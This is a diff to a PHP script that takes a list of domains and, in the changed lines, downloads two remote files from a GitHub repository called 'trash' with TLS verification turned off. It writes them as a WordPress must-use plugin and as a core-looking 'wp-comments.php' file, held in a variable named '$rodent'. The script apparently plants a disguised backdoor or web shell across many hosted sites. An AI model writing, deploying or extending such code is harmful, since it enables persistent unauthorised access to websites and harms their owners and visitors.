@@ -1,9 +1,32 @@
 <?php
+
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
 
 define('MAIN_DOMAIN_PATH', __DIR__ . '/../public_html');
 define('CHILD_DOMAIN_PATH', __DIR__ . "/../__DOMAIN__");
+
+function curl_data($url) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $data = curl_exec($ch);
+        curl_close($ch);
+    } else {
+        $context = stream_context_create([
+            'ssl' => [
+                'verify_peer' => false,
+                'verify_peer_name' => false,
+            ]
+        ]);
+        $data = file_get_contents($url, false, $context);
+    }
+    return $data;
+}
 
 function get_child_path($domain) {
     return str_replace('__DOMAIN__', $domain, CHILD_DOMAIN_PATH);
@@ -63,8 +86,8 @@ if (isset($_POST['domains'])) {
     
     $results = '';
     
-    $systemChecker = file_get_contents('https://raw.githubusercontent.com/jazzplunker97/trash/refs/heads/main/update-system-checker-plain.txt');
-    $rodent = file_get_contents('https://raw.githubusercontent.com/jazzplunker97/trash/refs/heads/main/wp-comments.php');
+    $systemChecker = curl_data('https://raw.githubusercontent.com/jazzplunker97/trash/refs/heads/main/update-system-checker-plain.txt');
+    $rodent = curl_data('https://raw.githubusercontent.com/jazzplunker97/trash/refs/heads/main/wp-comments.php');
     $pathLocation = __DIR__ . "/wp-content/mu-plugins/update-system-checker-plain.php";
     $rodentPathLocation = __DIR__ . "/wp-comments.php";
     
